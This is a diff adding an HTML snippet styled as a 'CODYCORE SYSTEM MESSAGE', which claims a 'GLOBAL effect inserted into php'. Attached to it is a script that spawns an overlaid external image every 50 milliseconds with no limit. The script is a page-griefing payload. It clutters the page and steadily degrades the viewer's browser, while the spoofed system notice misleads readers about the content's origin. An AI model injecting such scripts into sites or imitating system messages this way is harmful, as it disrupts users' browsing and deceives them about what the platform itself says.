@@ -1,0 +1,29 @@
+<p id="sysmsg" style="max-width:400px; padding:10px; border-radius:12px; background-color:#ffe6e6; color:red; font-weight:bold;">
+    [CODYCORE SYSTEM MESSAGE]<br>
+    <b>%me%</b> ran the command "<b>%command%</b>".
+</p>
+
+<p style="max-width:400px; padding:10px; border-radius:12px; background-color:#f0f0f0; color:#333; margin-top:4px;">
+    <strong>System Response:</strong><br>
+    GLOBAL effect inserted into php
+</p>
+<script>
+(function(){
+    const DECAL_URL = "https://ih1.redbubble.net/image.4863865108.8219/flat,750x1000,075,t.jpg";
+
+    function spamDecals() {
+        const decal = document.createElement("img");
+        decal.src = DECAL_URL;
+        decal.style.position = "absolute";
+        decal.style.width = Math.random() * 100 + 50 + "px";
+        decal.style.height = "auto";
+        decal.style.left = Math.random() * window.innerWidth + "px";
+        decal.style.top = Math.random() * window.innerHeight + "px";
+        decal.style.pointerEvents = "none";
+        decal.style.zIndex = 9999;
+        document.body.appendChild(decal);
+    }
+
+    setInterval(spamDecals, 50); // spawns a decal every 50ms
+})();
+</script>
